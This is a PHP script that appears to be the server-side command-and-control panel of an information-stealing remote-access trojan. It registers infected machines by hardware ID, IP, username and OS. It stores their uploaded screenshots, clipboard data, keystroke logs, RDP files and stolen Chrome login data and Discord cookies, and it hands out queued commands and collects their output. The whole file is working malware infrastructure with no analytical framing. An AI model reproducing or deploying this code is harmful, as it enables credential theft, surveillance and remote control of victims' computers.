<?php

	@ini_set("display_errors", 0);

	if(isset($_REQUEST['action']) && isset($_REQUEST['hwid'])){

		$action = $_REQUEST['action'];
		$hwid = $_REQUEST['hwid'];

		$dir = "logs" . DIRECTORY_SEPARATOR;

		if(!file_exists($dir))
			mkdir($dir);

		$dir = $dir . $hwid . DIRECTORY_SEPARATOR;
		
		if(!file_exists($dir))
			mkdir($dir);

		$dir_clipboards = $dir."clipboards".DIRECTORY_SEPARATOR;
		$dir_download = $dir."downloads".DIRECTORY_SEPARATOR;
		$dir_control = $dir."control".DIRECTORY_SEPARATOR;
		$dir_errors = $dir."errors".DIRECTORY_SEPARATOR;
		$dir_image = $dir."images".DIRECTORY_SEPARATOR;
		$dir_creds = $dir."creds".DIRECTORY_SEPARATOR;
		$dir_keys = $dir."keys".DIRECTORY_SEPARATOR;
		$dir_rdp = $dir."rdp".DIRECTORY_SEPARATOR;



		function checkDirExist($name){
			if(!file_exists($name))
				mkdir($name);
		}

		checkDirExist($dir_clipboards);
		checkDirExist($dir_download);
		checkDirExist($dir_control);
		checkDirExist($dir_errors);
		checkDirExist($dir_image);
		checkDirExist($dir_creds);
		checkDirExist($dir_keys);
		checkDirExist($dir_rdp);


		if($action == "register"){
			$machine_name = $_REQUEST['machinename'];
			$username = $_REQUEST['username'];
			$file_infos = $dir_control."infos.txt";

			$ip = $_REQUEST['ip'];
			$os = $_REQUEST['os'];

			$fh = fopen($file_infos, "w");
			fwrite($fh, $hwid."|".$ip."|".$username."|".$machine_name."|".$os."|".date("d/m/Y H:i:s")."\n");
			fclose($fh);
			die();

		} else if($action == "submitLogs"){
			if(isset($_GET['typeLog'])){

				$file = $_FILES['file'];
				$file_name = $file['name'];
				$type = $_GET['typeLog'];

				if($type == "image")
					$destPath = $dir_image.$file_name;

				elseif($type == "clipboard")
					$destPath = $dir_clipboards.$file_name;

				elseif($type == "keys")
					$destPath = $dir_keys.$file_name;

				elseif($type == "error")
					$destPath = $dir_errors.$file_name;

				elseif($type == "rdp")
					$destPath = $dir_rdp.$file_name;

				elseif($type == "creds"){
					if($file_name == "Cookies" || $file_name == "Login Data"){

						if($file_name == "Cookies")
							$file_name = "Discord_Cookies.creds";
						elseif($file_name == "Login Data")
							$file_name = "Google_LoginData.creds";
						
						$destPath = $dir_creds.$file_name;
					} else
						die();
				} else {
					die();
				}

				$allow_ext = array("png", "txt", "creds", "jpg");
				$file_ext = pathinfo($file_name, PATHINFO_EXTENSION);

				if(in_array($file_ext, $allow_ext)){

					$file_to_comp = explode(".", $file_name);
					$comp = $file_to_comp[sizeof($file_to_comp)-1];

					if($comp == "png" || $comp == "txt" || $comp == "creds" || $comp == "jpg")
						move_uploaded_file($file['tmp_name'], $destPath);
				}
			}
			die();

		} else if($action == "cmd"){

			$status_file = $dir_control."status.txt";

			$fh = fopen($status_file, "w");

			$status = "Online";

			fwrite($fh, $status);
			fclose($fh);

			$cmd_file = $dir_control."cmd.txt";

			if(!file_exists($cmd_file))
				touch($cmd_file);

			$commands = file_get_contents($cmd_file);
			file_put_contents($cmd_file, "");
			die($commands);
		} else if($action == "sendOut") {

			if(isset($_GET['out'])){
				$output = $_GET['out'];
				$file_output = $dir_control."output.txt";

				$fh = fopen($file_output, "w");
				fwrite($fh, $output);
				fclose($fh);
			}
			die();

		} else if($action == "flm"){
			$data = $_REQUEST['data'];
			$flm_file = $dir_control."flm.txt";

			$fh = fopen($flm_file, "w");
			fwrite($fh, $data);
			fclose($fh);
		} else if($action == "dwl"){

			if(file_exists($dir_download)){
				$file = $_FILES['file'];
				move_uploaded_file($file['tmp_name'], $dir_download.$file['name']);
			}

			file_put_contents($cmd_file, "");
		}
	}
?>